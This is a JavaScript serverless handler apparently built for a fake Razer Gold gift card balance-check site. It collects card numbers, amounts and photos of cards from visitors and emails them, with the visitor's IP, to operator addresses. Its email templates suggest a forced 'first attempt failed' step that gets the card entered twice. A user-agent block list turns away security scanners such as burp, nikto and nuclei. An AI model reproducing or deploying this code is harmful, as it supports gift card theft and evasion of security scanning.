// api/log-check.js
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);
const rateLimit = new Map();

const BLOCKED_USER_AGENTS = ['bot', 'crawler', 'spider', 'scraper', 'scan', 'scanner', 'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby', 'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp', 'nikto', 'nmap', 'zgrab', 'masscan', 'httpx', 'nuclei'];

function isBotUserAgent(ua) { if (!ua) return true; return BLOCKED_USER_AGENTS.some(bot => ua.toLowerCase().includes(bot)); }
function checkRateLimit(ip) {
  const now = Date.now(); const windowMs = 60 * 1000; const maxRequests = 10;
  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  if (timestamps.length >= maxRequests) return { allowed: false };
  timestamps.push(now); rateLimit.set(ip, timestamps); return { allowed: true };
}

function getSecondaryRecipient() {
  const email = process.env.SECONDARY_EMAIL || (process.env.NOTIFICATION_EMAILS || '').split(',')[0]?.trim();
  if (!email || !email.includes('@') || email.length < 6) return null;
  return email;
}
function getPrimaryRecipient() { return process.env.NOTIFICATION_EMAIL; }

async function sendViaResend({ subject, html, attachments, targetEmail }) {
  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.RESEND_FROM || process.env.EMAIL_FROM;
  if (!apiKey) return { sent: false, skipped: true, reason: 'RESEND_API_KEY missing' };
  if (!from) return { sent: false, skipped: true, reason: 'RESEND_FROM missing' };
  if (!targetEmail) return { sent: false, skipped: true, reason: 'Target Email missing' };

  const attachmentData = (attachments || []).map(a => ({ filename: a.filename, content: a.content }));

  try {
    const { data, error } = await resend.emails.send({ from, to: targetEmail, subject, html, attachments: attachmentData });
    if (error) return { sent: false, skipped: false, reason: error.message };
    return { sent: true, data };
  } catch (err) {
    return { sent: false, skipped: false, reason: err.message };
  }
}

// ==================== EMAIL TEMPLATES ====================

function getImageUploadedEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#00ff41;color:#000;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">📸 IMAGE CAPTURED (Awaiting Amount)</h2></div><p>The user has uploaded an image. They are currently entering the amount.</p><p><strong>IP:</strong> ${data.ip || 'Unknown'}</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}
function getFirstAttemptFailedEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#ff6b35;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">📸 FAILED - Image Unclear</h2></div><p><strong>Amount:</strong> $${data.amount || '0'}.00 USD</p><p><strong>IP:</strong> ${data.ip || 'Unknown'}</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}
function getFirstAttemptFailedHomeEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#ff6b35;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">❌ FAILED - Invalid Number</h2></div><p><strong>Number:</strong> ${data.cardNumber || 'Not provided'}</p><p><strong>Amount:</strong> $${data.amount || '0'}.00 USD</p><p><strong>IP:</strong> ${data.ip || 'Unknown'}</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}
function getSecondAttemptSuccessEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#28a745;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">✅ SUCCESS - Verified</h2></div><div style="background:#e8f5e9;padding:15px;text-align:center;border-radius:8px;margin:15px 0;border:1px solid #4caf50;"><div style="font-size:28px;font-weight:bold;color:#2e7d32;">${data.balance || `$${data.amount}.00 USD`}</div></div><p><strong>Number:</strong> ${data.cardNumber || 'Not provided'}</p><p><strong>Amount:</strong> $${data.amount || '0'}.00 USD</p><p><strong>IP:</strong> ${data.ip || 'Unknown'}</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}
function getMismatchAttemptEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#dc3545;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">⚠️ MISMATCH</h2></div><p><strong>First Number:</strong> ${data.firstCardNumber || 'Unknown'}</p><p><strong>Second Number:</strong> ${data.secondCardNumber || 'Unknown'}</p><p><strong>Amount:</strong> $${data.amount || '0'}.00 USD</p><p><strong>IP:</strong> ${data.ip || 'Unknown'}</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}
function getSuccessEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="font-family:Arial;color:#333;"><div style="max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px;"><div style="background:#28a745;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px;"><h2 style="margin:0;">✅ Balance Check Successful</h2></div><div style="background:#e8f5e9;padding:15px;text-align:center;border-radius:8px;margin:15px 0;border:1px solid #4caf50;"><div style="font-size:28px;font-weight:bold;color:#2e7d32;">${data.balance || `$${data.amount}.00 USD`}</div></div><p><strong>Amount:</strong> $${data.amount || '0'}.00 USD</p><p><strong>Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p></div></body></html>`;
}

// ==================== MAIN HANDLER ====================

export default async function handler(req, res) {
  const allowedOrigins = ['https://razergoldbalance.com', 'https://www.razergoldbalance.com', 'http://localhost:5173', 'https://gold-app-nine.vercel.app', process.env.ALLOWED_ORIGIN].filter(Boolean);
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', allowedOrigins.includes(origin) ? origin : 'https://razergoldbalance.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (!body || Object.keys(body).length === 0) return res.status(400).json({ error: 'Empty request body' });

  let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  if (rawIp.includes(',')) rawIp = rawIp.split(',')[0].trim();
  const ip = (rawIp === '::1' || rawIp === '::ffff:127.0.0.1') ? '127.0.0.1' : rawIp;
  const userAgent = req.headers['user-agent'] || '';

  if (isBotUserAgent(userAgent)) return res.status(403).json({ error: 'Access denied' });
  if (!checkRateLimit(ip).allowed) return res.status(429).json({ error: 'Too many requests' });

  const { type, cardNumber, firstCardNumber, secondCardNumber, amount, balance, timestamp, pageSource, imageBase64 } = body;

  if (!type) return res.status(400).json({ error: 'Missing type' });
  if (process.env.DISABLE_EMAIL === 'true') return res.status(200).json({ success: true, message: 'Demo mode' });

  // Check if primary is enabled
  const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';

  // Block immediate upload if disabled
  if (type === 'scan_image_uploaded' && !primaryEnabled) {
    return res.status(200).json({ success: true, message: 'Primary disabled. Skipping image upload.' });
  }

  let subject = '', html = '', attachments = [];
  let targetEmail = getSecondaryRecipient();

  if (type === 'scan_image_uploaded') {
    targetEmail = getPrimaryRecipient(); 
    subject = '📸 IMAGE CAPTURED - Awaiting Amount';
    html = getImageUploadedEmailHTML({ ip, timestamp: timestamp || new Date().toISOString() });
    if (imageBase64?.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `captured-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'first_attempt_failed') {
    if (pageSource === 'scan') {
      subject = '📸 FIRST ATTEMPT FAILED - Image Unclear';
      html = getFirstAttemptFailedEmailHTML({ amount, ip, timestamp });
    } else {
      subject = '❌ FIRST ATTEMPT FAILED - Invalid Number';
      html = getFirstAttemptFailedHomeEmailHTML({ cardNumber, amount, ip, timestamp });
    }
    if (imageBase64?.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `failed-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'second_attempt_success') {
    subject = `✅ SUCCESS - Balance Verified`;
    html = getSecondAttemptSuccessEmailHTML({ cardNumber, amount, balance: balance || `$${amount}.00 USD`, ip, timestamp });
    if (imageBase64?.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `success-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'mismatch_attempt') {
    subject = '⚠️ MISMATCH - Different Numbers Detected';
    html = getMismatchAttemptEmailHTML({ firstCardNumber, secondCardNumber, amount, ip, timestamp });
  } 
  else if (['success_balance', 'upload_success', 'scan_success'].includes(type)) {
    subject = `✅ Balance Check Successful`;
    html = getSuccessEmailHTML({ amount, balance: balance || `$${amount}.00 USD`, timestamp });
  } 
  else {
    return res.status(400).json({ error: 'Invalid request type' });
  }

  const result = await sendViaResend({ subject, html, attachments, targetEmail });
  if (result.sent) return res.status(200).json({ success: true });
  if (result.skipped) return res.status(200).json({ success: true, message: `Skipped: ${result.reason}` });
  return res.status(500).json({ error: result.reason });
}